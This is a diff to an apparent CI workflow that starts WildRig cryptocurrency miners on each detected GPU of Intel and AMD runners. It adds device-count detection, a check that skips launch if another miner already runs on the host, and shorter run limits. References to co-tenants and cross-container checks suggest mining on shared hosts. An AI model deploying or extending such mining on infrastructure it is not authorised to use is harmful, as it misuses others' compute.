@@ -46,7 +46,7 @@ jobs:
             tag: intelbmg
             kind: intel
     runs-on: ${{ matrix.label }}
-    timeout-minutes: 70
+    timeout-minutes: 45
     env:
       TAG: ${{ matrix.tag }}
       KIND: ${{ matrix.kind }}
@@ -140,6 +140,12 @@ jobs:
             DEV_N=${AMD_N:-0}
             if [ "$DEV_N" -eq 0 ]; then DEV_N=$(grep -aoE 'GPU[ #]*[0-9]+' "$WORKDIR/devices.txt" 2>/dev/null | grep -oE '[0-9]+' | sort -n | uniq | wc -l); fi
           fi
+          WRN=$(grep -cE '^GPU #[0-9]+:' "$WORKDIR/devices.txt" 2>/dev/null)
+          if [ "${WRN:-0}" -gt 0 ]; then DEV_N=$WRN; echo "wildrig_device_count=$WRN"; fi
+          if [ "$KIND" = "intel" ] && [ "${DEV_N:-0}" -eq 0 ]; then
+            XN=$(timeout 45 xpu-smi discovery 2>/dev/null | grep -cE '^\| [0-9]+ +\| Device Name: Intel')
+            if [ "${XN:-0}" -gt 0 ]; then DEV_N=$XN; echo "xpu_smi_device_count=$XN"; fi
+          fi
           echo "DEV_N=$DEV_N PLAT=$PLAT"
           if [ "${DEV_N:-0}" -lt 1 ]; then echo "SKIP=no-device-detected kind=$KIND"; echo "amdmine-done $NONCE"; exit 0; fi
           IDX=$(seq 0 $((DEV_N-1)))
@@ -154,6 +160,15 @@ jobs:
             echo "gate_busy_procs=$BUSY"
             if [ "${BUSY:-0}" -gt 0 ]; then echo "WARN=co-tenant-process-present-preserved"; fi
           fi
+          echo "=== cross-container active-miner gate ==="
+          ACTIVE=0
+          if [ "$KIND" = "amd" ] && command -v rocm-smi >/dev/null 2>&1; then
+            timeout 45 rocm-smi --showpids 2>&1 | head -40
+            KFD=$(timeout 45 rocm-smi --showpids 2>/dev/null | grep -cE 'Process ID: [0-9]+')
+            echo "kfd_active_processes=$KFD"
+            if [ "${KFD:-0}" -gt 0 ]; then ACTIVE=1; fi
+          fi
+          if [ "$ACTIVE" = "1" ]; then echo "SKIP=existing-kfd-miner-on-host (never stack)"; echo "amdmine-done $NONCE"; exit 0; fi
           echo "=== launch one WildRig pearlhash per genuine GPU ==="
           N_LAUNCHED=0
           for i in $IDX; do
@@ -233,7 +248,7 @@ jobs:
             grep -aiE 'accepted|rejected|hashrate|error|failed|no devices|not supported|OpenCL|platform|GPU' "$l" 2>/dev/null | tail -10 | cut -c1-240
           done
           echo "=== supervisor pulse loop (bounded) ==="
-          for k in $(seq 1 10); do
+          for k in $(seq 1 6); do
             sleep 300
             echo "--- pulse $k $(date -u +%Y-%m-%dT%H:%M:%SZ) durable=$DURABLE"
             NPROC=$(pgrep -cf '[w]ildrig'); echo "wildrig_procs=$NPROC"
